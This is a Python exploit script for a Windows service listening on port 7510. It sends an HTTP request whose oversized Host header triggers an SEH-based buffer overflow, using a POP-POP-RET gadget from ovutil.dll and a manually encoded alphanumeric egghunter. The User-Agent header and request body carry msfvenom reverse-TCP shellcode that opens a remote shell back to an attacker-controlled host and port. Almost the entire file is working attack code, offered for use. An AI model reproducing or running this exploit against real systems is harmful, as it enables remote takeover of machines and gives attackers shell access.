#!/usr/bin/python
#EmreOvunc

from socket import socket
from socket import AF_INET
from socket import SOCK_STREAM

#ovutil.dll -> 0x5A 44 74 5F
#POP EBX - POP - RET
seh = "\x5F\x74\x44\x5A"
#Break point -> shift + f9

#JMP SHORT 1035FEXX
#Converting -> jmp = "\xEB\x04\x90\x90" to new jmp
#x21 -> first ascii character.
jmp = "\x77\x21"

#x90 is in the badchar list.
nops = "\x43" * 2

#Save ESP
#PUSH ESP
#POP EBX
#savESP = "\x54\x5B"

#Restore ESP
#PUSH EBX
#POP ESP
#restorESP = "\x53\x5C"

egghead = "T00WT00W"

#Egghunter..  manually encoded.
egghunter =  "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x54\x58\x2D\x66\x4D\x55\x55\x2D"
egghunter += "\x66\x4B\x55\x55\x2D\x6A\x50\x55\x55"
egghunter += "\x50\x5C\x41\x41\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A\x2D\x21\x55\x55"
egghunter += "\x55\x2D\x21\x54\x55\x55\x2D\x49\x6F"
egghunter += "\x55\x6D\x50\x41\x41\x25\x4A\x4D\x4E"
egghunter += "\x55\x25\x35\x32\x31\x2A\x2D\x71\x21"
egghunter += "\x61\x75\x2D\x71\x21\x61\x75\x2D\x6F"
egghunter += "\x47\x53\x65\x50\x41\x41\x25\x4A\x4D"
egghunter += "\x4E\x55\x25\x35\x32\x31\x2A\x2D\x44"
egghunter += "\x41\x7E\x58\x2D\x44\x34\x7E\x58\x2D"
egghunter += "\x48\x33\x78\x54\x50\x41\x41\x25\x4A"
egghunter += "\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D"
egghunter += "\x71\x7A\x31\x45\x2D\x31\x7A\x31\x45"
egghunter += "\x2D\x6F\x52\x48\x45\x50\x41\x41\x25"
egghunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A"
egghunter += "\x2D\x33\x73\x31\x2D\x2D\x33\x33\x31"
egghunter += "\x2D\x2D\x5E\x54\x43\x31\x50\x41\x41"
egghunter += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x2D\x45\x31\x77\x45\x2D\x45\x31"
egghunter += "\x47\x45\x2D\x74\x45\x74\x46\x50\x41"
egghunter += "\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32"
egghunter += "\x31\x2A\x2D\x52\x32\x32\x32\x2D\x31"
egghunter += "\x31\x31\x31\x2D\x6E\x5A\x4A\x32\x50"
egghunter += "\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35"
egghunter += "\x32\x31\x2A\x2D\x31\x2D\x77\x44\x2D"
egghunter += "\x31\x2D\x77\x44\x2D\x38\x24\x47\x77\x50"


bof = "\x4c" * (3381-len(jmp)) + jmp + seh  + "A" * 32 + egghunter + "A" * 100 


request = "GET /topology/homeBaseView HTTP/1.1\r\n"
request += "Host: " + bof + ":7510\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"

#Run shellcode in unrestricted buffer
#msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp -e x86/alpha_mixed -f python LHOST=10.10.0.2 LPORT=4545
buf =  ""
buf += "\x89\xe2\xdb\xc8\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x58\x68\x6c"
buf += "\x42\x73\x30\x55\x50\x43\x30\x45\x30\x6c\x49\x6d\x35"
buf += "\x56\x51\x79\x50\x30\x64\x6e\x6b\x46\x30\x30\x30\x4c"
buf += "\x4b\x71\x42\x76\x6c\x6e\x6b\x63\x62\x47\x64\x6e\x6b"
buf += "\x74\x32\x44\x68\x36\x6f\x4d\x67\x62\x6a\x75\x76\x55"
buf += "\x61\x79\x6f\x4e\x4c\x47\x4c\x43\x51\x53\x4c\x55\x52"
buf += "\x34\x6c\x77\x50\x59\x51\x68\x4f\x64\x4d\x77\x71\x79"
buf += "\x57\x59\x72\x68\x72\x30\x52\x73\x67\x6c\x4b\x42\x72"
buf += "\x62\x30\x4c\x4b\x31\x5a\x55\x6c\x6c\x4b\x70\x4c\x72"
buf += "\x31\x73\x48\x69\x73\x32\x68\x76\x61\x6a\x71\x30\x51"
buf += "\x4e\x6b\x62\x79\x65\x70\x76\x61\x68\x53\x4c\x4b\x47"
buf += "\x39\x47\x68\x7a\x43\x74\x7a\x63\x79\x6c\x4b\x44\x74"
buf += "\x6c\x4b\x66\x61\x78\x56\x56\x51\x6b\x4f\x6e\x4c\x4a"
buf += "\x61\x38\x4f\x74\x4d\x66\x61\x58\x47\x75\x68\x4d\x30"
buf += "\x30\x75\x4c\x36\x37\x73\x61\x6d\x6a\x58\x67\x4b\x61"
buf += "\x6d\x65\x74\x50\x75\x78\x64\x31\x48\x6c\x4b\x52\x78"
buf += "\x51\x34\x46\x61\x49\x43\x35\x36\x4e\x6b\x76\x6c\x42"
buf += "\x6b\x4c\x4b\x42\x78\x57\x6c\x57\x71\x4a\x73\x4c\x4b"
buf += "\x74\x44\x6c\x4b\x36\x61\x6a\x70\x6c\x49\x61\x54\x57"
buf += "\x54\x76\x44\x43\x6b\x61\x4b\x45\x31\x31\x49\x53\x6a"
buf += "\x66\x31\x39\x6f\x6b\x50\x51\x4f\x63\x6f\x33\x6a\x6e"
buf += "\x6b\x55\x42\x5a\x4b\x4e\x6d\x51\x4d\x53\x58\x65\x63"
buf += "\x45\x62\x47\x70\x37\x70\x31\x78\x42\x57\x50\x73\x67"
buf += "\x42\x61\x4f\x31\x44\x42\x48\x32\x6c\x32\x57\x57\x56"
buf += "\x35\x57\x4c\x49\x78\x68\x6b\x4f\x7a\x70\x4e\x58\x7a"
buf += "\x30\x53\x31\x53\x30\x77\x70\x75\x79\x6a\x64\x76\x34"
buf += "\x36\x30\x61\x78\x64\x69\x6b\x30\x30\x6b\x73\x30\x79"
buf += "\x6f\x5a\x75\x73\x5a\x76\x6a\x31\x78\x66\x6a\x74\x4a"
buf += "\x35\x50\x36\x62\x43\x58\x63\x32\x35\x50\x66\x71\x4b"
buf += "\x71\x6d\x59\x68\x66\x56\x30\x70\x50\x42\x70\x36\x30"
buf += "\x63\x70\x32\x70\x33\x70\x62\x70\x53\x58\x6b\x5a\x46"
buf += "\x6f\x59\x4f\x49\x70\x39\x6f\x6e\x35\x4c\x57\x42\x4a"
buf += "\x36\x70\x33\x66\x66\x37\x42\x48\x4a\x39\x4e\x45\x43"
buf += "\x44\x70\x61\x4b\x4f\x39\x45\x6c\x45\x6b\x70\x34\x34"
buf += "\x35\x5a\x59\x6f\x52\x6e\x54\x48\x50\x75\x78\x6c\x49"
buf += "\x78\x35\x37\x67\x70\x73\x30\x57\x70\x50\x6a\x55\x50"
buf += "\x73\x5a\x67\x74\x33\x66\x31\x47\x32\x48\x57\x72\x38"
buf += "\x59\x48\x48\x31\x4f\x69\x6f\x48\x55\x6d\x53\x69\x68"
buf += "\x47\x70\x43\x4e\x64\x76\x6e\x6b\x50\x36\x42\x4a\x73"
buf += "\x70\x43\x58\x77\x70\x74\x50\x67\x70\x75\x50\x43\x66"
buf += "\x61\x7a\x37\x70\x53\x58\x31\x48\x4c\x64\x32\x73\x68"
buf += "\x65\x69\x6f\x78\x55\x7a\x33\x71\x43\x53\x5a\x43\x30"
buf += "\x51\x46\x62\x73\x63\x67\x72\x48\x35\x52\x7a\x79\x6f"
buf += "\x38\x33\x6f\x39\x6f\x4a\x75\x4b\x33\x39\x68\x55\x50"
buf += "\x71\x6d\x61\x38\x42\x78\x65\x38\x37\x70\x33\x70\x33"
buf += "\x30\x37\x70\x61\x7a\x53\x30\x52\x70\x32\x48\x46\x6b"
buf += "\x34\x6f\x54\x4f\x30\x30\x59\x6f\x79\x45\x36\x37\x50"
buf += "\x68\x53\x45\x52\x4e\x72\x6d\x75\x31\x59\x6f\x39\x45"
buf += "\x51\x4e\x61\x4e\x6b\x4f\x66\x6c\x55\x74\x44\x4f\x4d"
buf += "\x55\x42\x50\x39\x6f\x6b\x4f\x4b\x4f\x4a\x49\x4f\x6b"
buf += "\x6b\x4f\x4b\x4f\x39\x6f\x76\x61\x48\x43\x44\x69\x4f"
buf += "\x36\x30\x75\x4a\x61\x79\x53\x6f\x4b\x48\x70\x4f\x45"
buf += "\x6e\x42\x72\x76\x33\x5a\x73\x30\x32\x73\x39\x6f\x39"
buf += "\x45\x41\x41"

shell = egghead + buf + "C" * 500
request += "User-Agent: "+ shell +"\r\n"
request += "Content-Length: 1048580\r\n\r\n"
request += shell

expl = socket ( AF_INET, SOCK_STREAM )
expl.connect(("10.10.0.1", 7510))
expl.send(request)
expl.close()
